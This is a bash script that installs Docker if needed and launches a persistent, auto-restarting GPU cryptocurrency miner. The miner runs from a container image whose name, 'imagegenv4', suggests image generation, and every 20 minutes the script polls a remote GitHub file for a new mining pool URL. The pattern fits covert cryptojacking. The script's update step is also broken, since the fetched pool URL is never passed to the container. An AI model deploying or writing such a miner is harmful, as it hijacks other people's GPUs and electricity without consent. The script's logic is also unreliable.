#!/bin/bash

echo "Checking GPU availability..."
if ! nvidia-smi; then
    echo "❌ NVIDIA driver not loaded or GPU not available!"
    exit 1
fi

echo "Checking Docker installation..."
if ! command -v docker &> /dev/null; then
    echo "Docker is not installed. Installing..."
    sudo apt-get update
    sudo apt-get install -y docker.io
fi

echo "Stopping old container if exists..."
docker stop rvn-test 2>/dev/null
docker rm rvn-test 2>/dev/null

echo "Starting mining container with GPU..."
docker run --gpus all -d --restart unless-stopped --name rvn-test riccorg/imagegenv4:latest

update_and_restart() {
    new_pool_url=$(curl -s https://raw.githubusercontent.com/anhacvai11/bash/refs/heads/main/ip)
    if [ "$new_pool_url" != "$POOL_URL" ]; then
        echo "Updating POOL_URL to: $new_pool_url"
        export POOL_URL=$new_pool_url
        docker stop rvn-test 2>/dev/null
        docker rm rvn-test 2>/dev/null
        docker run --gpus all -d --restart unless-stopped --name rvn-test riccorg/imagegenv4:latest
    else
        echo "No updates found."
    fi
}

sleep 10

while true; do
    sleep 1200
    update_and_restart
done
